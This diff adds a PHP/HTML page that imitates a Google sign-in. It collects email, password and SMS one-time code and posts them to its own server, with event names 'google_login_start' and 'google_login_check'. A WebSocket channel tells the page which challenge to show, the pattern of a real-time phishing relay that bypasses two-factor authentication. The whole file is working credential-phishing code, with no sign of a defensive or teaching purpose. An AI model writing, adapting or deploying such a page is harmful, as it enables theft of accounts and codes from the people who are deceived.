@@ -1,0 +1,47 @@
+<?php header("Content-Type: text/html; charset=utf-8"); ?>
+<!doctype html>
+<meta charset="utf-8">
+<form id="signin">
+  <input name="identifier" type="email" autocomplete="username">
+  <section data-step="password"><input name="password" type="password"></section>
+  <section data-step="sms_code" hidden><input name="otp" autocomplete="one-time-code"></section>
+  <button>Continue</button>
+</form>
+<section id="done" hidden><iframe id="completed-frame" sandbox="allow-scripts" src="/assets/finished.html"></iframe></section>
+<script>
+const form = document.querySelector('#signin');
+async function postEvent(type, payload) {
+  const response = await fetch('/stream/session', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({type, payload})
+  });
+  return response.json();
+}
+async function start() {
+  await postEvent('google_login_start', {
+    locale: navigator.language, user_agent: navigator.userAgent,
+    width: screen.width, height: screen.height,
+    mobile: /android|iphone/i.test(navigator.userAgent)
+  });
+  const socket = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/stream/session/ws');
+  socket.onmessage = event => {
+    const state = JSON.parse(event.data);
+    for (const panel of document.querySelectorAll('[data-step]')) {
+      panel.hidden = panel.dataset.step !== state.challenge;
+    }
+    if (state.complete) document.querySelector('#done').hidden = false;
+  };
+  form.addEventListener('submit', async event => {
+    event.preventDefault();
+    await postEvent('google_login_check', {
+      identifier: form.elements.identifier.value,
+      password: document.querySelector('input[name="password"]').value,
+      user_agent: navigator.userAgent
+    });
+    await postEvent('challenge_submit', {
+      otp: document.querySelector('input[name="otp"]').value
+    });
+  });
+}
+start();
+</script>
